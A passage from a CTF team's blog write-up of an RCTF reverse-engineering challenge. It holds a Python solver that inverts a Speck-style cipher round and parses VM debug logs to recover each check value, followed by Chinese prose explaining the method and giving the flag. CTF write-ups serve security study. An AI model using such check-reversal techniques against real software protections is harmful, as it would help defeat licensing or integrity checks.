</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>((</span><span class=n>x</span> <span class=o>&lt;&lt;</span> <span class=n>n</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>x</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=mi>32</span> <span class=o>-</span> <span class=n>n</span><span class=p>)))</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ror32</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>((</span><span class=n>x</span> <span class=o>&gt;&gt;</span> <span class=n>n</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>x</span> <span class=o>&lt;&lt;</span> <span class=p>(</span><span class=mi>32</span> <span class=o>-</span> <span class=n>n</span><span class=p>)))</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>inv_upper_round</span><span class=p>(</span><span class=n>r0_next</span><span class=p>,</span> <span class=n>r1_next</span><span class=p>,</span> <span class=n>r2_k</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    逆向一轮上半轮: 给定输出 (r0_next,r1_next) 和 r2_k,
</span></span></span><span class=line><span class=cl><span class=s2>    求上一轮输入 (r0_prev,r1_prev)
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>c0</span> <span class=o>=</span> <span class=n>r0_next</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=n>e1</span> <span class=o>=</span> <span class=n>r1_next</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>d1</span> <span class=o>=</span> <span class=p>(</span><span class=n>e1</span> <span class=o>^</span> <span class=n>c0</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>    <span class=n>r1_prev</span> <span class=o>=</span> <span class=n>ror32</span><span class=p>(</span><span class=n>d1</span><span class=p>,</span> <span class=mi>3</span><span class=p>)</span>  <span class=c1># 逆 D: ROL3 -&gt; ROR3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>b0</span> <span class=o>=</span> <span class=p>(</span><span class=n>c0</span> <span class=o>^</span> <span class=n>r2_k</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>  <span class=c1># 逆 C: XOR r2_k</span>
</span></span><span class=line><span class=cl>    <span class=n>a0</span> <span class=o>=</span> <span class=p>(</span><span class=n>b0</span> <span class=o>-</span> <span class=n>r1_prev</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>  <span class=c1># 逆 B: 加法 -&gt; 减法</span>
</span></span><span class=line><span class=cl>    <span class=n>r0_prev</span> <span class=o>=</span> <span class=n>rol32</span><span class=p>(</span><span class=n>a0</span><span class=p>,</span> <span class=mi>8</span><span class=p>)</span>  <span class=c1># 逆 A: ROR8 -&gt; ROL8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r0_prev</span><span class=p>,</span> <span class=n>r1_prev</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ints =[13430028123848624410, 13767982679358783948, 11713643540287541804, 8785781270016547275, 5592440162506734093, 18308193844343275176, 1734829927, 12474808138286712448, 14773488025708418042, 6145507630794926191, 1802201963, 15600888960577064236, 6903078875579093773, 1852730990, 13105847985596755079, 12401591929655495169, 14481374110727130427, 3919366872831373201, 11451939409513851430, 1953789044, 17235855896972825888, 1987475062, 1916851354365983645, 2021161080, 2038004089, 2054847098, 17641256427711907975, 10954895412222869047, 9086595392298378073, 5295387722887053174, 15356410353063384153, 12187465423418120720, 14608926774405230659, 16160493834789769285, 1229539657, 13841060151611699047, 1263225675, 1280068684, 10181670230088315432, 1313754702, 1330597711, 5725376311369793868, 12817717089813452135, 11273537721551939182, 3076809482903728308, 1414812756, 1431655765, 6802938463641799296, 11625777768394830813, 1482184792]</span>
</span></span><span class=line><span class=cl><span class=c1># kkk =35</span>
</span></span><span class=line><span class=cl><span class=n>ints</span> <span class=o>=</span> <span class=p>[</span><span class=mi>13430028123848624410</span><span class=p>,</span> <span class=mi>13767982679358783948</span><span class=p>,</span> <span class=mi>11713643540287541804</span><span class=p>,</span> <span class=mi>8785781270016547275</span><span class=p>,</span> <span class=mi>5592440162506734093</span><span class=p>,</span> <span class=mi>18308193844343275176</span><span class=p>,</span> <span class=mi>1734829927</span><span class=p>,</span> <span class=mi>12474808138286712448</span><span class=p>,</span> <span class=mi>14773488025708418042</span><span class=p>,</span> <span class=mi>6145507630794926191</span><span class=p>,</span> <span class=mi>1802201963</span><span class=p>,</span> <span class=mi>15600888960577064236</span><span class=p>,</span> <span class=mi>6903078875579093773</span><span class=p>,</span> <span class=mi>1852730990</span><span class=p>,</span> <span class=mi>13105847985596755079</span><span class=p>,</span> <span class=mi>12401591929655495169</span><span class=p>,</span> <span class=mi>14481374110727130427</span><span class=p>,</span> <span class=mi>3919366872831373201</span><span class=p>,</span> <span class=mi>11451939409513851430</span><span class=p>,</span> <span class=mi>1953789044</span><span class=p>,</span> <span class=mi>17235855896972825888</span><span class=p>,</span> <span class=mi>1987475062</span><span class=p>,</span> <span class=mi>1916851354365983645</span><span class=p>,</span> <span class=mi>2021161080</span><span class=p>,</span> <span class=mi>2038004089</span><span class=p>,</span> <span class=mi>2054847098</span><span class=p>,</span> <span class=mi>17641256427711907975</span><span class=p>,</span> <span class=mi>13917286480390178951</span><span class=p>,</span> <span class=mi>9086595392298378073</span><span class=p>,</span> <span class=mi>5295387722887053174</span><span class=p>,</span> <span class=mi>15356410353063384153</span><span class=p>,</span> <span class=mi>12187465423418120720</span><span class=p>,</span> <span class=mi>14608926774405230659</span><span class=p>,</span> <span class=mi>16160493834789769285</span><span class=p>,</span> <span class=mi>1229539657</span><span class=p>,</span> <span class=mi>13841060151611699047</span><span class=p>,</span> <span class=mi>1263225675</span><span class=p>,</span> <span class=mi>1280068684</span><span class=p>,</span> <span class=mi>10181670230088315432</span><span class=p>,</span> <span class=mi>1313754702</span><span class=p>,</span> <span class=mi>1330597711</span><span class=p>,</span> <span class=mi>5725376311369793868</span><span class=p>,</span> <span class=mi>12817717089813452135</span><span class=p>,</span> <span class=mi>11273537721551939182</span><span class=p>,</span> <span class=mi>3076809482903728308</span><span class=p>,</span> <span class=mi>1414812756</span><span class=p>,</span> <span class=mi>1431655765</span><span class=p>,</span> <span class=mi>6802938463641799296</span><span class=p>,</span> <span class=mi>11625777768394830813</span><span class=p>,</span> <span class=mi>1482184792</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>kkk</span> <span class=o>=</span> <span class=mi>35</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=n>kkk</span> <span class=o>&lt;=</span> <span class=mi>50</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span><span class=p>,</span> <span class=n>vm</span> <span class=o>=</span> <span class=n>run_vm_with_ints</span><span class=p>(</span><span class=n>ints</span><span class=p>,</span> <span class=n>vmcode_path</span><span class=o>=</span><span class=s2>&#34;full_vmcode&#34;</span><span class=p>,</span> <span class=n>debug</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span> <span class=n>debug_after_n</span><span class=o>=</span><span class=n>kkk</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;vm.log&#34;</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>lines</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>readlines</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>input_value</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>nok</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>(</span><span class=n>lines</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>10</span> <span class=ow>and</span> <span class=s2>&#34;RETVAL R7 = 0x00000000000000ff stored at dp=0xffef&#34;</span> <span class=ow>in</span> <span class=n>lines</span><span class=p>[</span><span class=n>i</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>            <span class=n>k</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>lines</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;LDI R6 = &#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;,&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>([</span><span class=n>i</span><span class=p>,</span> <span class=n>k</span><span class=p>,</span> <span class=s2>&#34;k&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;XOR R0 ^= imm64&#34;</span> <span class=ow>in</span> <span class=n>lines</span><span class=p>[</span><span class=n>i</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>            <span class=n>c</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>lines</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;XOR R0 ^= imm64 &#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>([</span><span class=n>i</span><span class=p>,</span> <span class=n>c</span><span class=p>,</span> <span class=s2>&#34;c&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>line</span> <span class=o>=</span> <span class=n>lines</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;CMP R7 == 0x0000000000000000? R7=0x0000000000000000, ZF=True&#34;</span> <span class=ow>in</span> <span class=n>line</span> <span class=ow>and</span> <span class=n>nok</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>            <span class=k>while</span> <span class=s2>&#34;AND R7 &amp;= R6:&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>lines</span><span class=p>[</span><span class=n>i</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=s2>&#34;XOR R0 ^= imm64&#34;</span> <span class=ow>in</span> <span class=n>lines</span><span class=p>[</span><span class=n>i</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>                    <span class=n>c</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>lines</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;XOR R0 ^= imm64 &#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>([</span><span class=n>i</span><span class=p>,</span> <span class=n>c</span><span class=p>,</span> <span class=s2>&#34;c&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=s2>&#34;LDI R1 = &#34;</span> <span class=ow>in</span> <span class=n>lines</span><span class=p>[</span><span class=n>i</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>                    <span class=n>r</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>lines</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;LDI R1 = &#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;,&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=n>rr1</span> <span class=o>=</span> <span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>to_bytes</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=n>byteorder</span><span class=o>=</span><span class=s2>&#34;little&#34;</span><span class=p>)[:</span><span class=mi>4</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s2>&#34;little&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=n>rr2</span> <span class=o>=</span> <span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>to_bytes</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=n>byteorder</span><span class=o>=</span><span class=s2>&#34;little&#34;</span><span class=p>)[</span><span class=mi>4</span><span class=p>:</span><span class=mi>8</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s2>&#34;little&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>([</span><span class=n>i</span><span class=p>,</span> <span class=n>rr1</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>                    <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>([</span><span class=n>i</span><span class=p>,</span> <span class=n>rr2</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>                <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>            <span class=n>line</span> <span class=o>=</span> <span class=n>lines</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>k</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34; &amp; &#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34; &#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>k</span> <span class=o>==</span> <span class=mh>0xfffffffffffffff0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>nok</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=n>k</span> <span class=o>!=</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>([</span><span class=n>i</span><span class=p>,</span> <span class=n>k</span><span class=p>,</span> <span class=s2>&#34;k&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34; =&gt; &#34;</span> <span class=ow>in</span> <span class=n>lines</span><span class=p>[</span><span class=n>i</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>            <span class=n>input_value</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>lines</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34; =&gt; &#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>input_value</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;CMP R0 == &#34;</span> <span class=ow>in</span> <span class=n>lines</span><span class=p>[</span><span class=n>i</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>            <span class=n>cipher</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;CMP R0 == &#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;?&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>cipher</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>result</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>final_r0</span> <span class=o>=</span> <span class=n>cipher</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>            <span class=n>final_r1</span> <span class=o>=</span> <span class=p>(</span><span class=n>cipher</span> <span class=o>&gt;&gt;</span> <span class=mi>32</span><span class=p>)</span> <span class=o>&amp;</span> <span class=n>mask32</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=p>[</span><span class=n>i</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>result</span><span class=p>[</span><span class=o>-</span><span class=mi>4</span><span class=p>:]]</span>
</span></span><span class=line><span class=cl>            <span class=c1># 2) 逆 32 位主循环: 从 k=26..0 逐轮恢复</span>
</span></span><span class=line><span class=cl>            <span class=n>R2</span> <span class=o>=</span> <span class=n>build_r2_schedule</span><span class=p>(</span><span class=n>r</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>r0_curr</span><span class=p>,</span> <span class=n>r1_curr</span> <span class=o>=</span> <span class=n>final_r0</span><span class=p>,</span> <span class=n>final_r1</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>k</span> <span class=ow>in</span> <span class=nb>reversed</span><span class=p>(</span><span class=nb>range</span><span class=p>(</span><span class=mi>27</span><span class=p>)):</span>  <span class=c1># 26,25,...,0</span>
</span></span><span class=line><span class=cl>                <span class=n>r2_k</span> <span class=o>=</span> <span class=n>R2</span><span class=p>[</span><span class=n>k</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                <span class=n>r0_prev</span><span class=p>,</span> <span class=n>r1_prev</span> <span class=o>=</span> <span class=n>inv_upper_round</span><span class=p>(</span><span class=n>r0_curr</span><span class=p>,</span> <span class=n>r1_curr</span><span class=p>,</span> <span class=n>r2_k</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>r0_curr</span><span class=p>,</span> <span class=n>r1_curr</span> <span class=o>=</span> <span class=n>r0_prev</span><span class=p>,</span> <span class=n>r1_prev</span>
</span></span><span class=line><span class=cl>            <span class=n>r0_0</span><span class=p>,</span> <span class=n>r1_0</span> <span class=o>=</span> <span class=n>r0_curr</span><span class=p>,</span> <span class=n>r1_curr</span>
</span></span><span class=line><span class=cl>            <span class=c1># 合并成 64 位，得到进入 32 位轮前的值</span>
</span></span><span class=line><span class=cl>            <span class=n>v</span> <span class=o>=</span> <span class=p>((</span><span class=n>r1_0</span> <span class=o>&amp;</span> <span class=n>mask32</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>32</span><span class=p>)</span> <span class=o>|</span> <span class=p>(</span><span class=n>r0_0</span> <span class=o>&amp;</span> <span class=n>mask32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>x</span> <span class=o>=</span> <span class=n>v</span> <span class=o>&amp;</span> <span class=n>mask64</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>ck</span> <span class=ow>in</span> <span class=n>result</span><span class=p>[:</span><span class=o>-</span><span class=mi>4</span><span class=p>][::</span><span class=o>-</span><span class=mi>1</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>ck</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;k&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>x</span> <span class=o>=</span> <span class=p>(</span><span class=n>x</span> <span class=o>-</span> <span class=n>ck</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=o>&amp;</span> <span class=n>mask64</span>
</span></span><span class=line><span class=cl>                <span class=k>elif</span> <span class=n>ck</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;c&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>x</span> <span class=o>^=</span> <span class=n>ck</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>idx</span> <span class=o>=</span> <span class=n>ints</span><span class=o>.</span><span class=n>index</span><span class=p>(</span><span class=n>input_value</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>ints</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=n>x</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>kkk</span><span class=p>,</span> <span class=n>ints</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>kkk</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span></code></pre></td></tr></table></div></div><p>其中kkk是第几个check，具体逻辑是每次启动VM打印最后一轮（借助debug_after_n）check的日志（从数据读取开始到cmp），写入vm.log，vm里面在错误check的下一轮就会返回0导致vm退出，开始读取vm.log，使用find找到c、k、r等常量，同时提取出输入数值和cmp数值，找到cmp数值就开始做解密，由于代码都一样，只需根据c、k顺序修改x的计算即可，得到新的值替换掉ints里的输入数值，并打印新的ints</p><p>估计差不多30min能跑完，打印出最终的50个数，输入程序即可获取flag为RCTF{VM_ALU_SMC_RC4_SPECK!_593eb6079d2da6c187ed462b033fee34}</p><div class=blog-tags><a href=https://su-team.cn/tags/rctf/>RCTF</a>&nbsp;</div><h4 class=see-also>See also</h4><ul><li><a href=/post/rctf-2024-su-wu/>2024 RCTF SU WriteUp</a></li><li><a href=/post/2021-rctf-harmony-wu/>2021 RCTF Harmony Writeup</a></li></ul></article><ul class="pager blog-pager"><li class=previous><a href=https://su-team.cn/post/ntfy-2025-su-wu/ data-toggle=tooltip data-placement=top title="第八届“强网”拟态防御国际精英挑战赛 SU Writeup">&larr; Previous Post</a></li><li class=next><a href=https://su-team.cn/post/alictf-su-2026-wu/ data-toggle=tooltip data-placement=top title="2026 ALICTF SU WriteUp">Next Post &rarr;</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=https://ctftime.org/team/29641 title=CTFTime><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<img src=https://su-team.cn/img/ctftime.svg title=CTFTime alt=CTFTime style=width:60%;height:60%;position:absolute;top:20%;left:20%></span></a></li><li><a href=mailto:suers_xctf@126.com title="Email me"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://github.com/team-su title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted"><a href=https://su-team.cn>SUer</a>
&nbsp;&bull;&nbsp;&copy;
2026
&nbsp;&bull;&nbsp;
<a href=https://su-team.cn/>su-team</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.148.2</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script defer src=https://su-team.cn/js/katex.min.js></script><script defer src=https://su-team.cn/js/auto-render.min.js></script><script src=https://su-team.cn/js/jquery-3.7.0.slim.min.js></script><script src=https://su-team.cn/js/bootstrap.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\begin{equation}",right:"\\end{equation}",display:!0},{left:"\\begin{align}",right:"\\end{align}",display:!0},{left:"\\begin{alignat}",right:"\\end{alignat}",display:!0},{left:"\\begin{gather}",right:"\\end{gather}",display:!0},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script src=https://su-team.cn/js/main.js></script><script src=https://su-team.cn/js/photoswipe.min.js></script><script src=https://su-team.cn/js/photoswipe-ui-default.min.js></script><script src=https://su-team.cn/js/load-photoswipe.js></script></body></html>